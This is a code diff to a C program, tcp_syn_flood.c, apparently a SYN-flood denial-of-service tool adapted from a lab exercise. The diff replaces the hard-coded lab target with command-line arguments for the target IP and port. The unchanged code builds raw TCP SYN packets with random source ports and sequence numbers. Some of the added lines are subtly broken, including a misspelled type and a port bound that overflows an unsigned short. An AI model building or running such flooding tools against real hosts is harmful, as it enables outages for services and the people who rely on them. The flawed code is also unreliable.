@@ -1,3 +1,8 @@
+/* tcp_syn_flood.c
+ * written by adamalston and GiwbyAlbatross 2020 and 2026, respectively
+ * usage: tcp_syn_flood TARGET_PORT TARGET_IP
+ */
+
 #include <unistd.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -8,8 +13,6 @@
 #include <arpa/inet.h>
 #include "header.h"
 
-#define DEST_IP "10.0.2.69"
-#define DEST_PORT 80 // Attack the web server
 #define PACKET_LEN 1500
 
 unsigned short calculate_tcp_checksum(struct ipheader *ip);
@@ -46,7 +49,16 @@ int main(int argc, char ** argv)
         return 0;
     }
     
-    char * dest_ip = argv[argc-1];
+    char * dest_ip = argv[2];
+    unisgned short int port;
+    char * errstr;
+
+    port = strtonum(argv[1], 1, 65536, &errstr);
+    if (errstr != NULL) {
+        printf("%s: error parsing port specification :'%s'", argv[0], errstr);
+        return 2;
+    }
+    
     struct ipheader *ip = (struct ipheader *)buffer;
     struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader));
 
@@ -57,7 +69,7 @@ int main(int argc, char ** argv)
         memset(buffer, 0, PACKET_LEN);
         // Step 1: Fill in the TCP header.
         tcp->tcp_sport = rand(); 			// Use random source port
-        tcp->tcp_dport = htons(DEST_PORT);
+        tcp->tcp_dport = htons(port);
         tcp->tcp_seq = rand(); 				// Use random sequence #
         tcp->tcp_offx2 = 0x50;
         tcp->tcp_flags = TH_SYN; 			// Enable the SYN bit
